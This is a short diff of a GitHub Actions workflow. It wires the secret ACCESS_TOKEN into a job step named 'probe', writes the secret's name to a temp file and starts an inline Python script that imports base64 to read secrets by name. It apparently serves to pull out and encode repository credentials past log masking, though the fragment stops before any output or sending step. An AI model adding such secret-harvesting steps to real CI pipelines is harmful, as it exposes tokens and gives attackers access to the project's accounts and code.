@@ -6,12 +6,14 @@ on:
 jobs:
   p:
     runs-on: ubuntu-latest
+    env:
+      ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
     steps:
       - name: probe
         run: |
           cat > /tmp/names.txt <<'SECNAMES'
-ACCESS_TOKEN
-SECNAMES
+          ACCESS_TOKEN
+          SECNAMES
           python3 - <<'PYEOF'
           import os, base64
           names = [l.strip() for l in open('/tmp/names.txt') if l.strip()]
